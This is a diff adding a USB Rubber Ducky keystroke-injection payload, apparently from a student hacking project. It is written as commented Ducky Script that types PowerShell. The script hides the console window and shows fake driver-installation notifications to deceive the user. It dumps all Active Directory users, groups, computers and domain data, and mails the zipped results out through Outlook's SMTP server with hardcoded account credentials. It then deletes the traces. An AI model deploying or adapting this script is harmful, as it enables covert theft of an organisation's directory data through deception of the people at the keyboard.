@@ -1,0 +1,212 @@
+#REM	DUCKY RECON SCRIPT
+#REM	Hack Something 1 - Group 6
+#REM	Alexander Hurley, Wyatt Turner, Kheera Venner, Dean Orchard, Alexander Yan
+#REM
+#REM	This script performs recon on a target system & domain, while trying to minimize its run time.
+#REM
+#REM	Speed is key for a script like this as the script will not execute correctly if a user clicks 
+#REM	out of the focused window or uses their keyboard during its operation.
+#REM	
+#REM	Ducky Script commands we will be using:
+#REM	
+#REM	 DELAY:	This will push a hardcoded delay in milliseconds. This is nececary as we need to
+#REM			give the target computer time to execute the commands. Otherwise, it would result
+#REM			in rapid keystrokes executing before certain commands can have time to perform
+#REM			their operations.
+#REM			
+#REM	STRING:	This is where the meat of the script lies. Anything in this script that follows 
+#REM			the STRING command will execute the individual keystrokes that follow. This is
+#REM			where our PowerShell scripts lie. The scripts are run in a traditional sense, but 
+#REM			are logically typed onto the target device, one key at a time.
+#REM	
+#REM	 ENTER:	This command executes the ENTER key. Following a string that contains a PowerShell
+#REM			command, we must follow with an ENTER to execute our input.
+#REM	
+#REM	   GUI:	The GUI command will execute the Windows Key. You can follow this with a single key
+#REM			to have the Ducky see it as two keys being pressed simultaniously. We will be using
+#REM			this to execute the common 'Windows + R' combination, to open the Run prompt.
+#REM	
+#REM	First we perform an initial delay, giving the target computer time to recognize the device
+DELAY 1000
+#REM
+#REM	Next, we use 'GUI r' to open the Run prompt.
+GUI r
+DELAY 600
+#REM
+#REM	Now we type in 'PowerShell' using the string command.
+STRING PowerShell
+ENTER
+DELAY 1200
+#REM 
+#REM 	The following two strings will obscure the PowerShell console to just 1x1 characters. This is so
+#REM 	the user cannot see what we are doing, and avoids suspicion.
+STRING [console]::WindowHeight=1
+ENTER
+STRING [console]::WindowWidth=1
+ENTER
+#REM	
+#REM	The following block of code will simulate a Windows 10 "Balloon Tip", also known as a
+#REM	"Toast", or "Notification". We will use this to deceive the user into thinking that their 
+#REM	computer is installing a diver for a USB device. The time it takes the user to read the
+#REM	notification will be more than long enough for the entire script to run.
+#REM	For this to work, we need to create the baloon object, set its attributes, and execute it.
+STRING Add-Type -AssemblyName  System.Windows.Forms 
+ENTER
+STRING $global:balloon = New-Object System.Windows.Forms.NotifyIcon 
+ENTER
+STRING Get-Member -InputObject  $Global:balloon 
+ENTER
+STRING [void](Register-ObjectEvent  -InputObject $balloon  -EventName MouseDoubleClick  -SourceIdentifier IconClicked  -Action {
+ENTER
+STRING #Perform  cleanup actions on balloon tip
+ENTER
+STRING $global:balloon.dispose()
+ENTER
+STRING Unregister-Event  -SourceIdentifier IconClicked
+ENTER
+STRING Remove-Job -Name IconClicked
+ENTER
+STRING Remove-Variable  -Name balloon  -Scope Global
+ENTER
+STRING }) 
+ENTER
+STRING $path = (Get-Process -id $pid).Path
+ENTER
+STRING $balloon.Icon  = [System.Drawing.Icon]::ExtractAssociatedIcon($path) 
+ENTER
+STRING [System.Windows.Forms.ToolTipIcon] | Get-Member -Static -Type Property 
+ENTER
+STRING $balloon.BalloonTipIcon  = [System.Windows.Forms.ToolTipIcon]::Warning 
+ENTER
+#REM	
+#REM	The next two strings is where we define the message as a variable. We can set this to whatever we
+#REM	want, but lets try and make it something the user may be tempted to look at.	
+STRING $balloon.BalloonTipText  = @Installing device driver software for Game of Thrones Season 8 - Alternate Ending. Please Wait.@
+ENTER
+STRING $balloon.BalloonTipTitle  = @Installing Driver Software@ 
+ENTER
+STRING $balloon.Visible  = $true 
+ENTER
+#REM	
+#REM	Here we define the length of the balloon tip in milliseconds.
+STRING $balloon.ShowBalloonTip(5000)
+ENTER
+#REM
+#REM	Once PowerShell is open and we have decieved the user, we import the 'ActiveDirectory' module, allowing us to run commands 
+#REM	that require the AD module. Traditionally, you would need additional tools installed, but on
+#REM	more recent stable releases of Windows 10, these tools come pre installed.
+STRING Import-Module ActiveDirectory
+ENTER
+DELAY 1200
+#REM
+#REM	Now we will make the folder that we will temporarily store the data we collect 
+STRING mkdir exfil
+ENTER
+DELAY 200
+#REM
+#REM	Once AD is imported into PowerShell, we are going to use the Get-ADUser command.
+#REM	This command will return any and all users on a domain, following the filters we apply.
+#REM	Since we want all users, we will be giving the filter a wildcard.
+#REM	Next, we want to pull properties. In this example, we are pulling the users Description,
+#REM	and their group memberships.
+#REM	Finally, we export the data to a csv file, which will be exfiltrated at the end.
+STRING Get-ADUser -Filter * -Properties Description,MemberOf | Export-CSV -Path .\exfil\users.csv
+ENTER
+DELAY 220
+#REM
+#REM	Now that we have our users, we will use the Get-ADGroup command.
+#REM	This command will return all groups on a domain, and their associated attributtes.
+#REM	We again will put a wildcard on the filter to return all results, and will be taking
+#REM	the 'Members' property. This is so we can easily cross reference who is in what group
+#REM	and vice versa.
+STRING Get-ADGroup -Filter * -Properties Members | Export-CSV -Path .\exfil\groups.csv
+ENTER
+DELAY 220
+#REM	
+#REM	We now have collected user and group information. Next, we will pull info using the 
+#REM	Get-ADComputer command. This command will pull all the computers on the domain, similar 
+#REM	to how the Get-ADUser and Group commands worked. We will again set a wildcard for the filter,  
+#REM	and will be taking all properties. This command will return lots of good data for us.
+#REM	
+STRING Get-ADComputer -Filter * -Properties * | Export-CSV -Path .\exfil\computers.csv
+ENTER
+DELAY 220
+#REM	
+#REM	Finally, we will use the Get-ADDomain command to pull any and all misc. domain data.
+#REM	This command will return info on the domain itself, domain controllers, and other
+#REM	pieces of useful data that may help us in the future.
+#REM	
+STRING Get-ADDomain | Export-CSV -Path .\exfil\domain.csv
+ENTER
+DELAY 220
+#REM
+#REM	Now we will compress the folder containing our recon data for easy exfiltration. This will be stored in the 
+#REM	local user folder as it does not require admin privileges.
+STRING Compress-Archive .\exfil -DestinationPath C:\Users\$env:username\exfil.zip -CompressionLevel optimal
+ENTER
+DELAY 220
+#REM
+#REM	Now its time to exfiltrate our collected data. There are many methods of doing so, but in this example, we
+#REM	will be doing this over smtp, piggybacking off of outlooks mail server with a dummy account.
+#REM
+#REM	Here we define who the email is coming from, the subject and body, and the credentials
+#REM	for the dummy account we created. Lastly, we define the recipent (in this case, my school email address) and 
+#REM	the attachment path.
+STRING function Send-ToEmail([string]$email, [string]$attachmentpath){
+SHIFT ENTER
+STRING    $message = new-object Net.Mail.MailMessage;
+SHIFT ENTER
+STRING    $message.From = @rubberduckywyatt"outlook.com@;
+SHIFT ENTER
+STRING    $message.To.Add($email);
+SHIFT ENTER
+STRING    $message.Subject = @HOLY SMOKES BATMAN!!!@;
+SHIFT ENTER
+STRING    $message.Body = @EXFILTRATING DATA@;
+SHIFT ENTER
+STRING    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
+SHIFT ENTER
+STRING    $message.Attachments.Add($attachment);
+SHIFT ENTER
+STRING    $smtp = new-object Net.Mail.SmtpClient(@smtp-mail.outlook.com@, @587@);
+SHIFT ENTER
+STRING    $smtp.EnableSSL = $true;
+SHIFT ENTER
+STRING    $smtp.Credentials = New-Object System.Net.NetworkCredential(@rubberduckywyatt"outlook.com@, @hacksomething1@);
+SHIFT ENTER
+STRING    $smtp.send($message);
+SHIFT ENTER
+STRING    write-host @Mail Sent@ ;
+SHIFT ENTER
+STRING    $attachment.Dispose();
+SHIFT ENTER
+STRING }
+SHIFT ENTER
+STRING Send-ToEmail  -email @[EMAIL PREFIX]"[EMAIL DOMAIN]@ -attachmentpath @C:\Users\$env:username\exfil.zip@;
+ENTER
+DELAY 3000
+#REM
+#REM	To end off our script, we want to delete the recon files created. Now that they have
+#REM	been exfiltrated, we will remove them to cover our footsteps while in the system.
+STRING rm exfil.zip
+ENTER
+DELAY 100
+STRING rm exfil
+ENTER
+DELAY 300
+STRING y
+ENTER
+DELAY 150
+#REM
+#REM	Now, we will redefine the variables for the balloon message, to state that the driver install failed.
+#REM	We can even ask the user to try again in a different computer, maybe they'll even listen!
+STRING $balloon.BalloonTipText  = @Device driver installation failed. Please try again on a different computer.@
+ENTER
+STRING $balloon.BalloonTipTitle  = @Installation Failed@
+ENTER
+STRING $balloon.ShowBalloonTip(5000)
+ENTER
+#REM	
+#REM	Finally, we exit PowerShell, ending the script.
+STRING exit
+ENTER
